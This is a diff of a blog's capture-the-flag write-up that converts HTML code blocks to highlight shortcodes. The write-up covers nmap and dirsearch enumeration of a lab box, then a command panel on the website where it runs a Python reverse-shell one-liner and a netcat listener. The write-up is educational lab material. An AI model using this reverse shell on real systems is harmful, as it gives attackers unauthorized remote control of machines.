@@ -16,11 +16,16 @@ tags:
 </figure>
 
 <p>As we can see, the username is important and we just keep that in mind.</p>
-<pre><code>Username: R1ckRul3s
-</code></pre><p>We do not see any other useful information via the inspect element. Next step, enumeration. First, we try to do it using <code>nmap</code> which gives us the ports which are open</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">nmap -A &lt;ip address&gt;
-</code></pre></div><p>and you get the output as:</p>
-<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-24 20:54 IST
+{{< highlight text >}}
+Username: R1ckRul3s
+{{< /highlight >}}<p>We do not see any other useful information via the inspect element. Next step, enumeration. First, we try to do it using <code>nmap</code> which gives us the ports which are open</p>
+{{< highlight bash >}}
+nmap -A <ip address>
+{{< /highlight >}}
+
+<p>and you get the output as:</p>
+{{< highlight text >}}
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-24 20:54 IST
 Nmap scan report for 10.10.191.134
 Host is up (0.12s latency).
 Not shown: 998 closed ports
@@ -37,10 +42,15 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 25.26 seconds
-</code></pre></div><p>As you can see, only 2 ports are open, 22 and 80. I tried going to both of them by <code>&lt;ip address&gt;/&lt;port num&gt;</code> but there was nothing useful out there. Still a good thing to know.</p>
+{{< /highlight >}}
+
+<p>As you can see, only 2 ports are open, 22 and 80. I tried going to both of them by <code>&lt;ip address&gt;/&lt;port num&gt;</code> but there was nothing useful out there. Still a good thing to know.</p>
 <p>Next up, we try to enumerate better. dirsearch (<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a>) is a really cool tool which you can download which can brute force directories, files etc via command-line in the specified webservers. Once you have installed it in your system just type in:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">python3 diresearch.py -u http://&lt;ip adress&gt;
-</code></pre></div><p>It will take about 2-3 minutes to get the output.</p>
+{{< highlight bash >}}
+python3 diresearch.py -u http://<ip adress>
+{{< /highlight >}}
+
+<p>It will take about 2-3 minutes to get the output.</p>
 <figure>
     <img src="https://i.imgur.com/wZ8bNlH.png"/> 
 </figure>
@@ -63,10 +73,16 @@ Next up, lets go check out the <code>index.html</code>. Uh well, that just takes
 <p>So we have a command line where the website is not allowing us to use some commands. Lets see if it allows us to use python to get the reverse shell on our temrinal. Try typing in <code>python</code> or <code>python3</code>. You would observe that it does not allow <code>python</code> but allows <code>python3</code>. Boom, now we just need to execute the command to get the reverse shell.</p>
 <p>Here is a cheatsheet displaying different reverse shell commands: <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
 <p>For the python one, just remember that the &lsquo;attackers ip&rsquo; is our ip adress, which you can easily google on how to get. And specify any port that you want to. Before executing the command, just type in:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">nc -nlvp &lt;port number&gt;
-</code></pre></div><p>Let this command run in your terminal and copy the following as mentioned in the cheatsheet:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">python3 -c <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;&lt;YOUR IP&gt;&#34;,&lt;PORT NUMBER&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
-</code></pre></div><p>Type this in the command line in the website and you would see the shell get connected in your terminal. 10.17.9.4</p>
+{{< highlight bash >}}
+nc -nlvp <port number>
+{{< /highlight >}}
+
+<p>Let this command run in your terminal and copy the following as mentioned in the cheatsheet:</p>
+{{< highlight bash >}}
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR IP>",<PORT NUMBER>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+{{< /highlight >}}
+
+<p>Type this in the command line in the website and you would see the shell get connected in your terminal. 10.17.9.4</p>
 <figure>
     <img src="https://i.imgur.com/MUbaeGp.png"/> 
 </figure>
